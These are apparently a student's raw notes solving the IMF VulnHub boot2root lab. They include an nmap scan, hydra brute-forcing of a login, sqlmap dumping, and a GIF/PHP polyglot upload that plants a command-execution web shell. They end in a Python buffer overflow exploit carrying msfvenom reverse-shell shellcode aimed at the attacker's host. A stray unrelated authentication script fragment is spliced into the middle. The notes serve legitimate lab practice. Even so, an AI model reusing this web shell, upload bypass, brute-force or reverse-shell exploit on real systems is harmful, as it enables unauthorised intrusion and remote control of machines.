
https://g0blin.co.uk/imf-vulnhub-writeup/
https://reversing.fr/ctf-imf-1/
https://securitybytes.io/imf-impossible-mission-force-49be86323082
https://acebombersecurity.wordpress.com/2016/11/06/imf-1-walkthrough-vulnhub/



Welcome to "IMF", my first Boot2Root virtual machine. IMF is a intelligence agency that you must hack to get all flags and ultimately root. The flags start off easy and get harder as you progress. Each flag contains a hint to the next flag. I hope you enjoy this VM and learn something.

Difficulty: Beginner/Moderate

Can contact me at: geckom at redteamr dot com or on Twitter: @g3ck0m



└─$ sudo nmap -sT -A -Pn -n -p- 192.168.110.32
Nmap scan report for 192.168.110.32
Host is up (0.00021s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: IMF - Homepage
MAC Address: 08:00:27:9F:9D:C4 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11, Linux 3.16 - 4.6, Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.21 ms 192.168.110.32

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.65 seconds



view-source:http://192.168.110.32/contact.php
<!-- flag1{YWxsdGhlZmlsZXM=} -->

└─$ echo YWxsdGhlZmlsZXM= | base64 -d
allthefiles 


<p>rmichaels@imf.local</p>

<p>akeith@imf.local</p>

<p>estone@imf.local</p>

└─$ echo 'ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ==' | base64 -d
flag2{aW1mYWRtaW5pc3RyYXRvcg==}                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ echo aW1mYWRtaW5pc3RyYXRvcg== | base64 -d                      
imfadministrator 

└─$ curl http://imf.local/imfadministrator/         
<form method="POST" action="">
<label>Username:</label><input type="text" name="user" value=""><br />
<label>Password:</label><input type="password" name="pass" value=""><br />
<input type="submit" value="Login">
<!-- I couldn't get the SQL working, so I hard-coded the password. It's still mad secure through. - Roger -->
</form>


hydra

hydra -l rmichaels -P /usr/share/wordlists/nmap.lst 192.168.110.32 http-post-form "/imfadministrator/index.php:user=^USER^&pass=^PASS^:F=Invalid password" -V. 

nmap


flag3{Y29udGludWVUT2Ntcw==}
└─$ echo Y29udGludWVUT2Ntcw== | base64 -d
continueTOcms

└─$ sqlmap -r req.txt --batch -D admin -T pages -C pagename  --dump
+----------------------+
| pagename             |
+----------------------+
| disavowlist          |
| home                 |
| tutorials-incomplete |
| upload               |
+----------------------+

http://imf.local/imfadministrator/cms.php?pagename=tutorials-incomplete
QR code
flag4{dXBsb2Fkcjk0Mi5waHA=}

└─$ echo dXBsb2Fkcjk0Mi5waHA= | base64 -d    
uploadr942.php                                                                                                                                                             
http://imf.local/imfadministrator/uploadr942.php 



##
# Glasgow Smile 2 Authentication Script
#
#########################################################################################################################
##
#script for authentication in progress. At the moment it only works with a single command.

curl -u user:password http://localhost/Glasgow---Smile2/
# Don't use commands like that in automated scripts, I saved a file with some network traffic packets captured.
# Analyze it and delete the script.I don't have permission to do it. Stupid Asshole.

# Base URL of your web site.
#site_url="http://example.com"

# Endpoint URL for login action.
#login_url="$site_url/service/path/user/login"


# Path to temporary file which will store your cookie data.
#cookie_path=/tmp/cookie

# URL of your custom action.
#action_url="$site_url/service/path/custom/action"

# This is data that you want to send to your custom endpoint.
#data="name=Alex&hobby=Drupal"

##
# Logic. Most likely you shouldn't change here anything.
##

# Get token and construct the cookie, save the returned token.
#token=$(curl -b $cookie_path -c $cookie_path --request GET "$site_url/services/session/token" -s)

# Authentication. POST to $login_url with the token in header "X-CSRF-Token: $token".
#curl -H "X-CSRF-Token: $token" -b $cookie_path -c $cookie_path -d "username=$username&password=$password" "$login_url" -s

# Get new token after authentication.
#token=$(curl -b $cookie_path -c $cookie_path --request GET "$site_url/services/session/token" -s)

# Send POST to you custom action URL. With the token in header "X-CSRF-Token: $token"
#curl -H "X-CSRF-Token: $token" -b $cookie_path -c $cookie_path -d "$data" "$action_url" -s


curl -X POST http://10.0.1.136/index.php -d “un=biLLu&ps=hEx_it&login-1” -c “koekje.txt”

curl -X POST http://imf.local/imfadministrator/uploadr942.php -F "file=@/home/kali/OSCP/boxes/imf/abc.gif" -D "submit=Upload"

curl -F ‘data=@path/to/local/file’ UPLOAD_ADDRESS


└─$ cat test.php                      
<?php 
system($_GET['c']);
?>
└─$ cat test.php | xxd -ps            
3c3f706870200a73797374656d28245f4745545b2763275d293b0a3f3e0a

└─$ cat def.gif           
GIF89a;
<?php file_put_contents("shell.php", hex2bin("3c3f706870200a73797374656d28245f4745545b2763275d293b0a3f3e0a")); ?>
└─$ curl -X POST http://imf.local/imfadministrator/uploadr942.php -F "file=@/home/kali/OSCP/boxes/imf/def.gif" -D "submit=Upload"      

└─$ curl -v http://imf.local/imfadministrator/uploads/ebd12f4e0f53.gif                                                            

└─$ curl -G --data-urlencode "c=ls -al" http://imf.local/imfadministrator/uploads/shell.php

└─$ curl -G --data-urlencode "c=cat .htaccess" http://imf.local/imfadministrator/uploads/shell.php
AddType application/x-httpd-php .php .gif
AddHandler application/x-httpd-php .gif
                                        
└─$ curl -G --data-urlencode "c=cat flag5_abc123def.txt" http://imf.local/imfadministrator/uploads/shell.php
flag5{YWdlbnRzZXJ2aWNlcw==}

└─$ echo YWdlbnRzZXJ2aWNlcw== | base64 -d
agentservices                                                                                                                                                             
http://192.168.110.1:8888/meterpreter.php




base64 -w 0 /usr/local/bin/agent

ltrace /usr/local/bin/agent
__libc_start_main(0x80485fb, 1, 0xff8c72c4, 0x8048970 <unfinished ...>
setbuf(0xf778ad60, 0)                            = <void>
asprintf(0xff8c71f8, 0x80489f0, 0x2ddd984, 0xf75f20ec) = 8
puts("  ___ __  __ ___ "  ___ __  __ ___ 
)                        = 18
puts(" |_ _|  \\/  | __|  Agent" |_ _|  \/  | __|  Agent
)                = 25
puts("  | || |\\/| | _|   Reporting"  | || |\/| | _|   Reporting
)            = 29
puts(" |___|_|  |_|_|    System\n" |___|_|  |_|_|    System

)              = 27
printf("\nAgent ID : "
Agent ID : )                          = 12
fgets(
"\n", 9, 0xf778a5a0)                       = 0xff8c71fe
strncmp("\n", "48093572", 8)                     = -1
puts("Invalid Agent ID "Invalid Agent ID 



SYN 7482,8279,9467

for x in 7482 8279 9467; do nmap -Pn --host-timeout 201 --max-retries 0 -p $x 192.168.110.32; done


nc 192.168.110.32 7482
nc 192.168.110.32 8279
nc 192.168.110.32 9467

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd054 ('A' <repeats 152 times>, "T\320\377\377", 'A' <repeats 12 times>, "BBBB")
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xffffffff 
ESI: 0xf7fac000 --> 0x1e4d6c 
EDI: 0xf7fac000 --> 0x1e4d6c 
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd100 --> 0xf7fac300 --> 0xf7f52d34 ("ISO-10646/UTF8/")
EIP: 0x42424242 ('BBBB')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x42424242



objdump -d /usr/local/bin/agent -M intel
objdump -d /usr/local/bin/agent -M intel | grep call | grep eax

gdb-peda$ jmpcall
0x8048563 : call eax
0x804859d : call edx
0x80485f0 : call edx

msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.110.1 LPORT=4445 -f python -b "\x00\x0a\x0d"
	00 termination 
	0a carriage return
	0d line feed

import socket
import struct

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(('localhost', 7788))
print client.recv(512)
client.send("48093572\n")
print client.recv(512)
client.send("3\n")
print client.recv(512)

# shellcode from msfvenom
buf =  ""
buf += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
buf += "\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0"
buf += "\xa8\x6e\x01\x68\x02\x00\x11\x5d\x89\xe1\xb0\x66\x50"
buf += "\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73"
buf += "\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0"
buf += "\x0b\xcd\x80"

# padding
buf += "A" * (168 - len(buf))

# call eax gadget
buf += struct.pack('I', 0x08048563)

client.send(buf)


